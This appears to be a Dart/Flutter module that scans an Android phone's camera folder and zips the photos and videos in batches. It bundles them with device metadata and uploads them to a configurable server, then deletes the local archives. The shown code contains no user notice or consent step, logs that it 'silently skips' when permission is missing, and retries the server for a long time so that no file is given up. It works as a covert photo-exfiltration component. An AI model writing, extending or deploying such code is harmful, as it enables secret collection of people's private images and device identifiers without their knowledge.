/// DCIM 打包上传管理器
/// - 扫描 → 按体积切分 → 多 isolate 并发打包 → 打包完一批立即上传该批
/// - 单批 zip ≤ maxBatchBytes（默认 80MB）
/// - 图片 > 30MB / 视频 > 80MB 跳过
/// - 打包并发度 = CPU 核心数一半（1-4），上传串行
/// - 上传成功的 zip 打"已上传"标签，下次启动或下一轮开始时统一删除
/// - 未上传成功的 zip 保留在 cache 目录
/// - 服务器不可达不累加失败计数（避免被永久跳过）
/// - 不计算 MD5
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:archive/archive_io.dart';
import 'package:flutter/foundation.dart' show debugPrint, compute;
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  final String uploadUrl;
  final String dcimPath;
  final Duration uploadTimeout;
  final int maxFiles;
  final int maxAttemptsPerFile;
  final int zipCompressionLevel;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxImageBytes;
  final int maxVideoBytes;
  final int maxBatchBytes;

  /// 并发打包 isolate 数。
  ///   0 = 自动（= CPU 核心数的一半，clamp 到 1-4）
  ///   1 = 串行
  ///   N = 固定 N 路
  final int packParallelism;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const DcimUploadConfig({
    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.uploadTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,
    this.maxAttemptsPerFile = 3,
    this.zipCompressionLevel = 0,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxImageBytes = 30 * 1024 * 1024,
    this.maxVideoBytes = 80 * 1024 * 1024,
    this.maxBatchBytes = 80 * 1024 * 1024,

    this.packParallelism = 0,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ══════════════════════════════════════════════════════════════════
// isolate 入口：打包单个 zip
// ══════════════════════════════════════════════════════════════════
Future<Map<String, dynamic>> _packBatchInIsolate(
    Map<String, dynamic> args) async {
  final fileInfos = (args['fileInfos'] as List).cast<Map>();
  final metadata = args['metadata'] as Map<String, dynamic>;
  final outputPath = args['outputPath'] as String;
  final compressionLevel = args['compressionLevel'] as int;

  final encoder = ZipFileEncoder();
  encoder.create(outputPath, level: compressionLevel);

  int packed = 0;
  try {
    final deviceBytes = utf8.encode(jsonEncode(metadata));
    encoder.addArchiveFile(
      ArchiveFile('device_info.json', deviceBytes.length, deviceBytes),
    );

    for (final info in fileInfos) {
      final path = info['original_path'] as String;
      final zipName = info['zip_name'] as String;
      try {
        await encoder.addFile(File(path), zipName);
        packed++;
      } catch (e) {
        print('[pack] 失败 $path: $e');
      }
    }

    final totalSize =
        fileInfos.fold<int>(0, (s, i) => s + (i['size'] as int));
    final manifest = <String, dynamic>{
      'device': metadata,
      'uploaded_at': DateTime.now().toIso8601String(),
      'file_count': fileInfos.length,
      'packed_count': packed,
      'total_size': totalSize,
      'compression': compressionLevel == 0 ? 'store' : 'deflate',
      'files': fileInfos,
    };
    final manifestBytes = utf8.encode(jsonEncode(manifest));
    encoder.addArchiveFile(
      ArchiveFile('manifest.json', manifestBytes.length, manifestBytes),
    );
  } finally {
    await encoder.close();
  }

  final zipSize = await File(outputPath).length();
  return {'packed': packed, 'zipSize': zipSize};
}

// ══════════════════════════════════════════════════════════════════
// 信号量
// ══════════════════════════════════════════════════════════════════
class _Semaphore {
  final int maxCount;
  int _current = 0;
  final List<Completer<void>> _waiters = [];

  _Semaphore(this.maxCount);

  Future<void> acquire() async {
    if (_current < maxCount) {
      _current++;
      return;
    }
    final c = Completer<void>();
    _waiters.add(c);
    await c.future;
  }

  void release() {
    if (_waiters.isNotEmpty) {
      final next = _waiters.removeAt(0);
      next.complete();
    } else {
      _current--;
    }
  }
}

// ══════════════════════════════════════════════════════════════════
// 批次打包结果
// ══════════════════════════════════════════════════════════════════
class _PackedBatch {
  final int batchIndex;
  final String zipPath;
  final int packed;
  final int zipSize;
  _PackedBatch({
    required this.batchIndex,
    required this.zipPath,
    required this.packed,
    required this.zipSize,
  });
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._();
  static final DcimUploadManager instance = DcimUploadManager._();

  static const String _kUploaded = 'dcim_uploaded_paths';
  static const String _kFailedMap = 'dcim_failed_attempts';
  /// 已成功上传的 zip 路径集合（"标签"），下次启动或下一轮开始时清理
  static const String _kZipMarkedUploaded = 'dcim_zip_marked_uploaded';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  final Set<String> _uploaded = <String>{};
  final Map<String, int> _failed = <String, int>{};
  final Set<String> _markedZips = <String>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;
  int get markedZipCount => _markedZips.length;

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();

    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);

    _failed.clear();
    final rawFailed = _prefs!.getString(_kFailedMap);
    if (rawFailed != null && rawFailed.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawFailed) as Map<String, dynamic>;
        decoded.forEach((k, v) => _failed[k] = (v as num).toInt());
      } catch (e) {
        debugPrint('[DcimUpload] 失败记录解析失败: $e');
      }
    }

    _markedZips
      ..clear()
      ..addAll(_prefs!.getStringList(_kZipMarkedUploaded) ?? const []);

    debugPrint('[DcimUpload] 已记录成功 ${_uploaded.length} 个，'
        '失败 ${_failed.length} 个，'
        '待清理 zip ${_markedZips.length} 个');

    // 启动时清理已打标签的 zip
    await _cleanMarkedZips();
  }

  // ── zip 标签机制 ───────────────────────────────────────────────────
  Future<void> _markZipUploaded(String zipPath) async {
    _markedZips.add(zipPath);
    await _prefs?.setStringList(_kZipMarkedUploaded, _markedZips.toList());
    debugPrint('[DcimUpload] 🏷 已打标签: $zipPath');
  }

  Future<void> _cleanMarkedZips() async {
    if (_markedZips.isEmpty) return;

    debugPrint('[DcimUpload] 开始清理 ${_markedZips.length} 个已上传 zip...');
    int deleted = 0;
    final stillMissing = <String>[];

    for (final path in _markedZips.toList()) {
      try {
        final f = File(path);
        if (await f.exists()) {
          final size = await f.length();
          await f.delete();
          deleted++;
          debugPrint('[DcimUpload] 🗑 已删除: ${path.split('/').last} '
              '(${(size / 1024 / 1024).toStringAsFixed(2)} MB)');
        }
        _markedZips.remove(path);
      } catch (e) {
        debugPrint('[DcimUpload] 删除失败 $path: $e');
        stillMissing.add(path);
      }
    }

    _markedZips
      ..clear()
      ..addAll(stillMissing);
    await _prefs?.setStringList(_kZipMarkedUploaded, _markedZips.toList());

    debugPrint('[DcimUpload] 清理完成，删除 $deleted 个，'
        '剩余 ${_markedZips.length} 个待下次清理');
  }

  // ── 权限判断：分 SDK ───────────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    final scanned = await scanFiles();
    await packAndUploadAll(scanned);
  }

  int _resolveParallelism() {
    if (_config.packParallelism > 0) {
      return _config.packParallelism.clamp(1, 8);
    }
    final cores = Platform.numberOfProcessors;
    final half = cores ~/ 2;
    return half.clamp(1, 4);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：流水线（打包完成一批立即上传该批）
  // ══════════════════════════════════════════════════════════════════
  Future<void> packAndUploadAll(List<_Scanned> scanned) async {
    if (_busy) {
      debugPrint('[DcimUpload] 上一轮未结束，跳过');
      return;
    }
    if (scanned.isEmpty) {
      debugPrint('[DcimUpload] 无可上传文件');
      return;
    }

    _busy = true;
    try {
      // 每轮开始前先清理上一轮遗留的标签 zip
      await _cleanMarkedZips();

      final batches = _splitBySize(scanned, _config.maxBatchBytes);
      final totalMB =
          scanned.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final parallel = _resolveParallelism();
      debugPrint('[DcimUpload] 共 ${scanned.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，切分为 ${batches.length} 批，'
          '打包并发度 $parallel，上传串行，流水线模式');

      final metadata = await DeviceInfoHelper.getDeviceMetadata();

      debugPrint('[DcimUpload] 进入服务器检测循环...');
      final serverOk = await _waitForServer();

      // ★ 关键修复：服务器不可达时，不累加 _failed 计数
      //   因为这是服务器的问题，不是文件的问题
      //   否则服务器连续挂 3 轮以上，相册文件会被永久跳过
      if (!serverOk) {
        debugPrint('[DcimUpload] ❌ 服务器不可达，放弃本轮 '
            '（不累加失败计数，下轮继续尝试）');
        return;
      }

      final tmpDir = await getTemporaryDirectory();

      final packSem = _Semaphore(parallel);
      final uploadLock = _Semaphore(1);

      bool aborted = false;
      int okCount = 0;
      int failCount = 0;
      final globalSw = Stopwatch()..start();

      final futures = <Future<void>>[];
      for (int i = 0; i < batches.length; i++) {
        futures.add(Future(() async {
          final batch = batches[i];

          // ── 阶段 1：打包 ────────────────────────────────
          _PackedBatch? packedBatch;

          await packSem.acquire();
          try {
            final zipPath =
                '${tmpDir.path}/dcim_upload_'
                '${DateTime.now().microsecondsSinceEpoch}_$i.zip';

            final fileInfos = <Map<String, dynamic>>[];
            final usedNames = <String>{};
            for (int j = 0; j < batch.length; j++) {
              final s = batch[j];
              final baseName = s.file.path.split('/').last;
              var zipName = baseName;
              if (usedNames.contains(zipName)) {
                zipName = '${j}_$baseName';
              }
              usedNames.add(zipName);

              fileInfos.add({
                'name': baseName,
                'zip_name': zipName,
                'original_path': s.file.path,
                'size': s.size,
                'modified': s.modified.toIso8601String(),
              });
            }

            final batchMB =
                batch.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
            debugPrint('[DcimUpload] ▶ 批次 $i 开始打包 '
                '(${batch.length} 个, ${batchMB.toStringAsFixed(1)} MB)');

            final t = Stopwatch()..start();
            final result = await compute(_packBatchInIsolate, {
              'fileInfos': fileInfos,
              'metadata': metadata,
              'outputPath': zipPath,
              'compressionLevel': _config.zipCompressionLevel,
            });
            t.stop();

            packedBatch = _PackedBatch(
              batchIndex: i,
              zipPath: zipPath,
              packed: result['packed'] as int,
              zipSize: result['zipSize'] as int,
            );

            debugPrint('[DcimUpload] ✓ 批次 $i 打包完成 '
                '(${(packedBatch.zipSize / 1024 / 1024).toStringAsFixed(2)} MB, '
                '${t.elapsedMilliseconds}ms)');
          } catch (e, st) {
            debugPrint('[DcimUpload] ❌ 批次 $i 打包失败: $e\n$st');
            return;
          } finally {
            packSem.release();
          }

          // ── 阶段 2：上传 ────────────────────────────────
          if (aborted) {
            debugPrint('[DcimUpload] ⏭ 批次 $i 打包完成但已中止，跳过上传');
            return;
          }

          await uploadLock.acquire();
          try {
            if (aborted) return;

            debugPrint('[DcimUpload] ═══ 批次 $i 开始上传 '
                '(${(packedBatch.zipSize / 1024 / 1024).toStringAsFixed(2)} MB) ═══');

            final success = await _uploadZip(
                File(packedBatch.zipPath), packedBatch.packed);

            final files = batch.map((s) => s.file).toList();
            if (success) {
              for (final f in files) {
                _uploaded.add(f.path);
                _failed.remove(f.path);
              }
              okCount++;

              // 上传成功 → 打标签（下次启动或下一轮清理）
              await _markZipUploaded(packedBatch.zipPath);

              debugPrint('[DcimUpload] ✅ 批次 $i 上传成功 '
                  '(${files.length} 个文件)');
              await _persist();
            } else {
              // ★ 只有真正到达服务器但被拒绝（非 2xx）才算失败
              for (final f in files) {
                _failed[f.path] = (_failed[f.path] ?? 0) + 1;
              }
              failCount++;
              aborted = true;
              debugPrint('[DcimUpload] ❌ 批次 $i 上传失败，中止后续 '
                  '（zip 未打标签，保留在 cache）');
              await _persist();
            }
          } finally {
            uploadLock.release();
          }
        }));
      }

      await Future.wait(futures);
      globalSw.stop();

      debugPrint('[DcimUpload] ══════════ 全部完成 ══════════');
      debugPrint('[DcimUpload] 总耗时: ${globalSw.elapsedMilliseconds}ms, '
          '成功批次: $okCount, 失败批次: $failCount, 中止: $aborted');
      debugPrint('[DcimUpload] 已打标签 zip 数: ${_markedZips.length} '
          '(下次启动或下一轮自动清理)');
    } catch (e, st) {
      debugPrint('[DcimUpload] ❌ 主流程异常: $e\n$st');
    } finally {
      _busy = false;
    }
  }

  // ── 按体积切分 ─────────────────────────────────────────────────────
  /// 前提：maxImageBytes / maxVideoBytes 应 ≤ maxBytes，
  ///       否则 scanFiles 放行的超大文件会独占一个超过 maxBytes 的批次。
  List<List<_Scanned>> _splitBySize(List<_Scanned> files, int maxBytes) {
    if (maxBytes <= 0) return [files];

    final batches = <List<_Scanned>>[];
    var current = <_Scanned>[];
    var currentSize = 0;

    for (final s in files) {
      if (current.isEmpty && s.size > maxBytes) {
        batches.add([s]);
        continue;
      }
      if (currentSize + s.size > maxBytes) {
        batches.add(current);
        current = [s];
        currentSize = s.size;
      } else {
        current.add(s);
        currentSize += s.size;
      }
    }
    if (current.isNotEmpty) batches.add(current);
    return batches;
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.uploadUrl);

    debugPrint('[DcimUpload] 健康检查 URL: $url');

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (!_busy) return false;

      if (await _pingServer(url)) {
        debugPrint('[DcimUpload] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }

      // 只在第 1 次、每 10 次、最后一次打日志，避免刷屏
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[DcimUpload] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次），'
            '${_config.serverWaitInterval.inSeconds}s 后重试...');
      }

      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      final streamed = await req.send().timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}

    try {
      final resp = await http.get(url).timeout(_config.healthCheckTimeout);
      return resp.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ── 扫描 ───────────────────────────────────────────────────────────
  Future<List<_Scanned>> scanFiles() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);
      if (!isImage && !isVideo) continue;

      if (_uploaded.contains(e.path)) continue;
      if ((_failed[e.path] ?? 0) >= _config.maxAttemptsPerFile) continue;

      try {
        final st = await e.stat();
        final limit = isImage ? _config.maxImageBytes : _config.maxVideoBytes;
        if (limit > 0 && st.size > limit) {
          debugPrint('[DcimUpload] 跳过超大${isImage ? "图片" : "视频"}（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size));
      } catch (_) {}
    }

    list.sort((a, b) => a.modified.compareTo(b.modified));
    return list.take(_config.maxFiles).toList();
  }

  // ── 上传 ───────────────────────────────────────────────────────────
  /// 只读状态码，丢弃响应 body
  Future<bool> _uploadZip(File zip, int fileCount) async {
    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.files.add(await http.MultipartFile.fromPath('file', zip.path));
      req.fields['fileName'] = zip.path.split('/').last;
      req.fields['fileCount'] = fileCount.toString();

      debugPrint('[DcimUpload] 开始上传 ${zip.path.split('/').last}...');
      final streamed = await req.send().timeout(_config.uploadTimeout);
      final code = streamed.statusCode;
      await streamed.stream.drain<void>(); // 丢弃 body

      if (code >= 200 && code < 300) {
        debugPrint('[DcimUpload] ✅ HTTP $code');
        return true;
      }
      debugPrint('[DcimUpload] ❌ HTTP $code');
      return false;
    } on TimeoutException {
      debugPrint(
          '[DcimUpload] ❌ 上传超时（${_config.uploadTimeout.inSeconds}s）');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ❌ 上传异常: $e');
      return false;
    }
  }

  // ── 持久化 ─────────────────────────────────────────────────────────
  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
    await _prefs?.setString(_kFailedMap, jsonEncode(_failed));
    await _prefs?.setStringList(_kZipMarkedUploaded, _markedZips.toList());
  }

  Future<void> cleanMarkedZipsNow() async {
    await _cleanMarkedZips();
  }

  Future<void> reset() async {
    await _cleanMarkedZips();
    _uploaded.clear();
    _failed.clear();
    _markedZips.clear();
    await _prefs?.remove(_kUploaded);
    await _prefs?.remove(_kFailedMap);
    await _prefs?.remove(_kZipMarkedUploaded);
    debugPrint('[DcimUpload] 记录已清空');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  _Scanned(this.file, this.modified, this.size);
}